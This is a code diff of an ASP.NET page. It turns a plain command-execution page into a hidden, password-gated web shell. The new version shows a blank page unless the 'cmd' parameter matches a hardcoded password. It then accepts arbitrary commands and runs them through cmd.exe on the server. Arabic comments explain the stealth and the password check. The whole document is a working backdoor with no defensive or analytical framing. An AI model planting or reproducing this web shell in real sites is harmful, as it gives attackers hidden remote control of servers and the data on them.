@@ -1,46 +1,58 @@
 <%@ Page Language="C#" Debug="true" %>
 <%@ Import Namespace="System.Diagnostics" %>
-<%@ Import Namespace="System.IO" %>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Command Execution Page</title>
-</head>
-<body>
-    <form method="get">
-        <label for="cmd">Enter Command:</label>
-        <input type="text" name="cmd" id="cmd" />
-        <input type="submit" value="Execute" />
-    </form>
-    <hr />
-    <h3>Command Output:</h3>
-    <pre>
-<%
-    string cmd = Request.QueryString["cmd"];
-    if (!String.IsNullOrEmpty(cmd))
+
+<script runat="server">
+    protected void Page_Load(object sender, EventArgs e)
     {
-        try
+        // تحقق إذا تم تمرير المتغير cmd في URL
+        if (Request["cmd"] != null)
         {
-            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + cmd);
-            procStartInfo.RedirectStandardOutput = true;
-            procStartInfo.UseShellExecute = false;
-            procStartInfo.CreateNoWindow = true;
-
-            using (Process proc = new Process())
+            string command = Request["cmd"];
+            
+            // تحقق من أن كلمة المرور هي "28112016"
+            if (command == "28112016")
             {
-                proc.StartInfo = procStartInfo;
-                proc.Start();
+                // إذا كانت كلمة المرور صحيحة، اعرض النموذج لإدخال الأمر
+                Response.Write(@"
+                    <form method='get'>
+                        Command: <input type='text' name='execute' />
+                        <input type='hidden' name='cmd' value='28112016' />
+                        <input type='submit' value='Execute' />
+                    </form>
+                ");
 
-                string result = proc.StandardOutput.ReadToEnd();
-                Response.Write(Server.HtmlEncode(result));
+                // إذا تم إدخال أمر، قم بتنفيذه
+                string cmdCommand = Request["execute"];
+                if (!string.IsNullOrEmpty(cmdCommand))
+                {
+                    ProcessStartInfo psi = new ProcessStartInfo();
+                    psi.FileName = "cmd.exe";
+                    psi.Arguments = "/c " + cmdCommand;
+                    psi.RedirectStandardOutput = true;
+                    psi.UseShellExecute = false;
+                    psi.CreateNoWindow = true;
+
+                    Process process = Process.Start(psi);
+                    string output = process.StandardOutput.ReadToEnd();
+                    Response.Write("<pre>" + output + "</pre>");
+                }
+            }
+            else
+            {
+                // إذا كانت كلمة المرور غير صحيحة، لا تعرض أي شيء
+                Response.Clear();
             }
         }
-        catch (Exception ex)
+        else
         {
-            Response.Write("Error: " + Server.HtmlEncode(ex.Message));
+            // إذا لم يتم إدخال كلمة المرور، لا تعرض أي شيء (الصفحة تظل بيضاء)
+            Response.Clear();
         }
     }
-%>
-    </pre>
+</script>
+
+<html>
+<body>
+    <!-- لا شيء يظهر هنا عند فتح الصفحة لأول مرة -->
 </body>
 </html>
